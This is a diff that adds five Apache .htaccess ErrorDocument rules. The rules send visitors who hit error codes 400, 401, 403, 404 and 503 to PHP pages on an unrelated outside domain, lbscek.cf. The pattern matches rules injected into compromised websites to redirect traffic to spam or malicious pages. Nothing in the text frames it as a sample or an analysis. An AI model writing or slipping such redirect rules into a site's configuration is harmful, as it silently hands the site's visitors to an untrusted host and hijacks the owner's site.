@@ -1,0 +1,5 @@
+ErrorDocument 400 http://lbscek.cf/error/1.php
+ErrorDocument 401 http://lbscek.cf/error/2.php
+ErrorDocument 403 http://lbscek.cf/error/3.php
+ErrorDocument 404 http://lbscek.cf/error/4.php
+ErrorDocument 503 http://lbscek.cf/error/5.php
